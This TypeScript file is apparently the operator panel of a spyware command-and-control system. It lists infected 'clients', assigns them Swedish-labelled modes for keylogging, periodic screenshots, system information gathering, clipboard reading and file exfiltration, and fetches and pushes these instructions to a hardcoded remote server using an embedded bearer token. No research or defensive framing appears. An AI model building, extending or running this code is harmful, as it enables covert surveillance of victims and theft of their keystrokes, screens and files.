
import { INSTRUCTION_CODE } from './scriptData';

// Interface definitions
export interface ScriptsData {
  [key: string]: string;
}

export interface InstructionType {
  id: string;
  name: string;
  description: string;
  code: string;
}

export interface ClientInstruction {
  id: string;
  name: string;
  system: string;
  currentInstruction: string;
  lastActivity: string;
}

// More descriptive instruction descriptions
const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
  "standard": "Standardinstruktion för klippbordsavläsning",
  "keylogger": "Registrerar tangentbordstryckningar",
  "screenshot": "Tar skärmdumpar periodiskt",
  "system_info": "Samlar in systeminformation",
  "file_exfiltration": "Söker och skickar specifika filer"
};

// Server configuration - Use correct URL format based on the Flask server configuration in server.py
const SERVER_BASE_URL = 'https://neea.fun';
// API Endpoints from server.py
const API_CLIENTS_ENDPOINT = '/api/clients';
const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
const API_CONFIG_ENDPOINT = '/api/get_config';
const API_INSTRUCTIONS_ENDPOINT = '/get_instructions';

// Authentication token from server.py
const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';

// Extract scripts from instructions.py
export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  // In a real app, this would parse the Python file server-side
  // For now, we're returning the actual instruction code from instructions.py
  try {
    console.log("Importing instructions from instructions.py");
    
    // Return the actual instruction code
    return INSTRUCTION_CODE;
  } catch (error) {
    console.error("Error extracting scripts:", error);
    // Fallback to simplified values if needed
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar",
      "keylogger": "# Instruktion: Keylogger-läge",
      "screenshot": "# Instruktion: Screenshot-läge",
      "system_info": "# Instruktion: System Info-läge",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge",
    };
  }
}

/**
 * Get scripts data from API or fallback to mock data
 * @returns {Promise<ScriptsData>} The scripts data
 */
export async function getScripts(): Promise<ScriptsData> {
  try {
    // Use the correct API endpoint with proper authorization
    const response = await fetch(`${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`
      }
    });
    
    if (!response.ok) {
      throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
    }
    
    try {
      const data = await response.json();
      return data;
    } catch (error) {
      console.warn("API returned non-JSON response, using instruction code instead");
      return INSTRUCTION_CODE;
    }
  } catch (error) {
    console.error("Error fetching scripts:", error);
    
    // Fallback to local instruction code
    const scripts = await extractScriptsFromInstructionsPy();
    return scripts;
  }
}

// Get all available instruction types
export async function getInstructionTypes(): Promise<InstructionType[]> {
  const scripts = await extractScriptsFromInstructionsPy();
  
  return Object.keys(scripts).map(key => ({
    id: key,
    name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
    description: INSTRUCTION_DESCRIPTIONS[key] || key,
    code: scripts[key]
  }));
}

// Get all clients and their current instructions
export async function getClients(): Promise<ClientInstruction[]> {
  try {
    // Use the correct API endpoint from server.py
    const response = await fetch(`${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return await response.json();
  } catch (error) {
    console.error("Error fetching clients:", error);
    // Return empty array rather than mock data
    return [];
  }
}

// Update a client's instruction
export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
  try {
    // Use the correct API endpoint with proper path parameter replacement
    const endpoint = API_CLIENT_INSTRUCTION_ENDPOINT.replace('{clientId}', clientId);
    const response = await fetch(`${SERVER_BASE_URL}${endpoint}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AUTH_TOKEN}`,
      },
      body: JSON.stringify({ instruction: instructionId }),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return true;
  } catch (error) {
    console.error("Error updating client instruction:", error);
    return false;
  }
}
